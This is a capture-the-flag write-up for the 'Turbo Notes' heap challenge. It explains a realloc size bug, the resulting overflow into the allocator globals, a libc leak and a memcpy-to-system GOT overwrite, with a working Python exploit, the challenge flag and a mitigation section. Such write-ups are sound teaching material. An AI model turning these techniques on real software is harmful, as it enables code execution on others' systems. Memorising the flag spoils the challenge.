# Turbo Notes — Heap Pwn Writeup

Oct 25, 2026 · @Demian

## Overview

`turbo-malloc` ("Turbo Notes") is a 64-bit Linux heap challenge: a menu-driven notes app backed by a hand-rolled allocator that replaces libc `malloc` / `free` / `realloc`. The flag lives in `/flag.txt` and is readable only through the setuid helper `/readflag`; the binary is served over `socat`, so getting code execution and running `/readflag` dumps the flag straight to the socket.

**The bug:** menu option 5 ("Expand") is a `realloc` that never checks that the new size is larger, and copies the *old* chunk length into the *new*, smaller buffer — a fully attacker-controlled linear heap overflow. Because the allocator's free-list `head` and the app's `notes[]` / `note_sizes[]` tables sit in memory **immediately after** the 1 MB arena, that one overflow rewrites all of them and yields an arbitrary read/write through the normal Read/Write menu. From there we leak libc through a GOT entry, overwrite `memcpy@GOT` with `system`, and turn `realloc`'s own `memcpy(dst, …)` into `system("/readflag")`.

**Flag:** `flag{4gile_and_f4st_n0t3s_what_m0re_c0uld_you_want_a9a88453754718fa192681857cd01ba7}`

## Recon: protections and memory map

Built `-no-pie -g` against Ubuntu 24.04 glibc 2.39.

| Protection | State | Consequence |
| --- | --- | --- |
| PIE | off (ET\_EXEC) | every global and GOT slot is at a fixed address |
| RELRO | partial | `.got.plt` is writable → GOT overwrite works |
| NX | on | no shellcode on the heap; reuse libc |
| Stack canary | present | irrelevant — the bug is in the heap, not the stack |

The decisive detail is the data layout: the 1 MB arena is bracketed by exactly the things we want to control — the GOT just before it, and the allocator's `head` plus the note tables just after it. All fixed (no PIE):

```
0x404000  GOT: abort puts write printf read memcpy ...   <-- writable
0x404078  first_request
0x4040c0  memory[0x100000]    <-- the 1 MB "heap" arena
   ...
0x5040c0  head                <-- free-list head, RIGHT after the arena
0x5040e0  notes[16]           <-- char* per note
0x504160  note_sizes[16]      <-- size  per note
```

`head`, `notes[]` and `note_sizes[]` are literally the next bytes after `memory[]`, so a linear overflow off the end of the arena lands directly in the allocator's state and in the pointer/size tables the menu uses for every read and write. The two GOT slots we need:

```
puts@GOT   = 0x404010
memcpy@GOT = 0x404048
```

## The allocator

A 16-byte chunk header is stored inline, right before the user data:

```c
struct chunk { struct chunk *next; size_t size; char memory[]; };
#define MAGIC ((void*)0xf45735)
```

- `turbo_malloc(n)` rounds `n` up to 16, walks a singly-linked free list (`head`) first-fit, and either returns a whole free chunk or splits it, writing a new free-chunk header inline in the leftover space. An in-use chunk is marked by `next == MAGIC`.
- `turbo_free(p)` reads the header at `p - 16`, aborts unless `next == MAGIC` (a weak "is it in use" check), then pushes the chunk onto `head`. There is **no coalescing** ("turbo-heap must be blazingly fast!!!").
- `turbo_realloc(p, n)` = `turbo_malloc(n)` → `memcpy(new, p->memory, p->size)` → `turbo_free(p)`.

Two design facts drive the whole exploit: free-list links live *inside* the arena (so overflowing data corrupts allocator metadata), and `head` plus the note tables sit *just past* the arena (so overflowing the last chunk corrupts them).

## The vulnerability: realloc copies the old size

Menu option 5 is labelled "Expand", but it is a plain `realloc` with no check that the new size is larger than the old one:

```c
void *turbo_realloc(void *ptr, size_t size) {
    void *new_memory = turbo_malloc(size);              // sized for the NEW request
    ...
    struct chunk *chunk = (struct chunk*)((char*)ptr - CHUNK_SIZE);
    memcpy(new_memory, chunk->memory, chunk->size);     // copies the OLD size!
    turbo_free(ptr);
    return new_memory;
}
```

`chunk->size` is the *old* chunk's (rounded) size. "Expand" a note to a **smaller** size and `turbo_malloc` hands back a small buffer, but `memcpy` copies the larger old length into it — a linear heap overflow. And the copied bytes are the old note's contents, which we wrote ourselves, so the overflow is **fully attacker-controlled data**, not leftover garbage.

Everything else is just aiming that copy at the end of the arena.

## From overflow to arbitrary read/write

Plan: make the overflowing copy *start at the very end of the arena* so it spills into `head` / `notes[]` / `note_sizes[]`. From a clean process the layout is deterministic:

1. **SOURCE** = first note, size `0x130`. The first allocation sits at `memory` (`0x4040c0`), data at `0x4040d0`.
2. **FILLER** = second note, size `0xffe90`. This eats almost the whole arena and leaves a single `0x10` free chunk at `0x5040a0`.
3. Write SOURCE (`0x130` bytes) with the payload we want to land in the globals.
4. **Expand SOURCE to `0x10`.** `turbo_malloc(0x10)` returns that last free chunk → data at `0x5040b0`; then `memcpy(0x5040b0, SOURCE, 0x130)` runs off the end of the arena, straight over the globals.

With the new buffer at `0x5040b0`, each target maps to payload offset `addr - 0x5040b0`:

| Target | Address | Offset | Value written |
| --- | --- | --- | --- |
| head | 0x5040c0 | 0x10 | 0 |
| notes\[2\] | 0x5040f0 | 0x40 | puts@GOT (0x404010) |
| notes\[3\] | 0x5040f8 | 0x48 | memcpy@GOT (0x404048) |
| notes\[4\] | 0x504100 | 0x50 | &head (0x5040c0) |
| notes\[6\] | 0x504110 | 0x60 | 0x4040b0 (scratch) |
| note\_sizes\[2\] | 0x504170 | 0xc0 | 8 |
| note\_sizes\[3\] | 0x504178 | 0xc8 | 8 |
| note\_sizes\[4\] | 0x504180 | 0xd0 | 8 |
| note\_sizes\[6\] | 0x5041a0 | 0xe0 | 0x40 |

`realloc` then sets `notes[1]` / `note_sizes[1]` for the expanded slot, so we simply don't rely on slot 1. Slots 2 / 3 / 4 / 6 now hold pointers and sizes of our choosing, and the menu's option 3 (`write(1, notes[i], note_sizes[i])`) and option 4 (`read(0, notes[i], note_sizes[i])`) become **arbitrary read and arbitrary write**.

## libc leak and code execution

**Leak.** Read slot 2 (points at `puts@GOT`, size 8) → the runtime address of `puts`. Subtract the offset from the provided `libc.so.6` (2.39-0ubuntu8.7):

```
libc_base = leak_puts - 0x87be0
system    = libc_base + 0x58750
```

**RCE without a one-gadget.** The only libc call in the program whose first argument (`rdi`) we control is `memcpy(dst, …)` inside `turbo_realloc` — `dst` is whatever `turbo_malloc` returns. So:

1. Through the scratch slot (6 → `0x4040b0`), write a fake chunk header followed by the command string: `next = 0`, `size = 0x10`, then `"/readflag\0"` at `0x4040c0`.
2. Overwrite `memcpy@GOT` (slot 3) with `system`.
3. Overwrite the allocator's `head` (slot 4) with `0x4040b0` — our fake chunk.
4. Expand slot 2. `turbo_malloc(0x10)` follows the fake `head` and returns `0x4040c0`; `realloc` then calls `memcpy(0x4040c0, …)`, which is now `system`, i.e. **`system("/readflag")`**. The flag prints to the socket.

One wrinkle: `turbo_malloc` also uses `memcpy` internally (to stamp the chunk header), so once `memcpy@GOT = system` that internal call fires first as `system(0x4040b0)`. Those bytes start with a NUL (`next = 0`), so it is `system("")` — `sh -c ""` returns at once and harmlessly, then the outer `memcpy` → `system("/readflag")` runs. Nothing to handle.

**Remote transport.** On the live instance the service sat behind TLS (a silent TCP connect on the instancer hostname, zero bytes back). The exploit auto-detects this: it tries plain TCP, and if no banner arrives it reconnects wrapping the socket in TLS (certificate verification off, SNI = host). `--ssl` forces it.

## Exploit

The core chain below is the whole exploit; the tube (`recvuntil` / `recvn`, with plain + TLS auto-detect) and the `__main__` CLI are boilerplate, so the full runnable version is the attached **`exploit.py`** (pure stdlib, no pwntools).

```python
import struct

def p64(x): return struct.pack("<Q", x & (2**64-1))
def u64(b): return struct.unpack("<Q", b.ljust(8, b"\0"))[0]

# fixed no-PIE addresses
HEAD, GOT_puts, GOT_memcpy, FAKE = 0x5040c0, 0x404010, 0x404048, 0x4040b0
OFF_puts, OFF_system = 0x87be0, 0x58750      # provided libc 2.39-0ubuntu8.7
SRC, FILLER = 0x130, 0xffe90

# --- menu helpers (t = tube with recvuntil/recvn/send/sendline) ---
def create(t, slot, size):
    t.recvuntil(b"> ");            t.sendline(b"1")
    t.recvuntil(b"Slot (0-15): "); t.sendline(str(slot).encode())
    t.recvuntil(b"Size: ");        t.sendline(str(size).encode())
    t.recvuntil(b"Successfully created new note!")

def write_note(t, slot, data):
    t.recvuntil(b"> ");            t.sendline(b"4")
    t.recvuntil(b"Slot (0-15): "); t.sendline(str(slot).encode())
    t.recvuntil(b"Data: ");        t.send(data)   # exactly note_sizes[slot] bytes

def read_note(t, slot, size):
    t.recvuntil(b"> ");            t.sendline(b"3")
    t.recvuntil(b"Slot (0-15): "); t.sendline(str(slot).encode())
    return t.recvn(size)

def expand(t, slot, newsize, finish=True):
    t.recvuntil(b"> ");            t.sendline(b"5")
    t.recvuntil(b"Slot (0-15): "); t.sendline(str(slot).encode())
    t.recvuntil(b"New size: ");    t.sendline(str(newsize).encode())
    if finish: t.recvuntil(b"Successfully expanded note!")

def exploit(t, cmd):
    t.recvuntil(b"6: Expand a note", timeout=20)   # banner

    create(t, 1, SRC)        # SOURCE: first alloc @0x4040c0
    create(t, 0, FILLER)     # FILLER: leaves a 0x10 free chunk @0x5040a0

    pay = bytearray(SRC)
    def setq(off, v): pay[off:off+8] = p64(v)
    setq(0x10, 0)            # head
    setq(0x40, GOT_puts)     # notes[2] -> leak
    setq(0x48, GOT_memcpy)   # notes[3] -> memcpy@GOT = system
    setq(0x50, HEAD)         # notes[4] -> overwrite allocator head
    setq(0x60, FAKE)         # notes[6] -> fake chunk + command string
    setq(0xc0, 8); setq(0xc8, 8); setq(0xd0, 8); setq(0xe0, 0x40)  # note_sizes
    write_note(t, 1, bytes(pay))

    expand(t, 1, 0x10)       # realloc shrink -> memcpy overflow into globals

    libc = u64(read_note(t, 2, 8)) - OFF_puts
    system = libc + OFF_system
    print("[+] libc base = 0x%x" % libc)

    cmdb = cmd.encode() + b"\0"
    write_note(t, 6, (p64(0) + p64(0x10) + cmdb).ljust(0x40, b"\0"))  # fake chunk + cmd
    write_note(t, 3, p64(system))     # memcpy@GOT = system
    write_note(t, 4, p64(FAKE))       # head = fake chunk
    expand(t, 2, 0x10, finish=False)  # turbo_malloc -> 0x4040c0 ; memcpy == system(cmd)
```

Run it (local needs `turbo-malloc` + `libc.so.6` + `ld-linux-x86-64.so.2` in the cwd):

```
python3 exploit.py                 # local
python3 exploit.py <host> <port>   # remote, auto-detects TLS (or add --ssl)
```

## Why it worked, and how to kill it

- **Inline metadata next to user data.** Free-list links live inside the arena, so any data overflow corrupts allocator state. Keep metadata out-of-band, or guard it with a random cookie.
- **Globals adjacent to the arena.** `head`, `notes[]` and `note_sizes[]` immediately follow `memory[]`, so an end-of-arena overflow rewrites them. `mmap` the arena separately with guard pages instead of wedging a `.bss` array next to live globals.
- **`realloc` copying the old size.** The whole chain starts here; the fix is one line — copy `min(old_size, new_size)`.
- **Weak free validation, no coalescing.** The `next == MAGIC` check is trivially satisfied once headers can be forged; real allocators also check alignment, arena bounds and double-free.
- **Partial RELRO + no PIE.** Full RELRO makes the GOT read-only (kills the `memcpy@GOT` overwrite); PIE removes the fixed addresses the whole plan depends on.

In short, the "blazingly fast" allocator traded away every boundary a real `malloc` keeps — between metadata, user data, and the rest of the program — and parked the crown jewels one byte past the arena.
